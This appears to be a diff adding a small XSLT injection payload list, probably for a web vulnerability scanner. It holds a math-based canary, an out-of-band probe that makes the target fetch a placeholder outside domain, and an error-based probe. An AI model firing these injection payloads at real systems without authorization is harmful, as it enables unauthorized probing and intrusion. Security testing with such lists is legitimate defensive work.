@@ -1,0 +1,6 @@
+##XSLT Injection - Math-Based (Canary: 1337)##
+<xsl:value-of select="7*191"/>
+##XSLT Injection - OOB##
+<xsl:value-of select="document('http://{domain}/xslt')"/>
+##XSLT Injection - Error-Based##
+<xsl:invalid/>
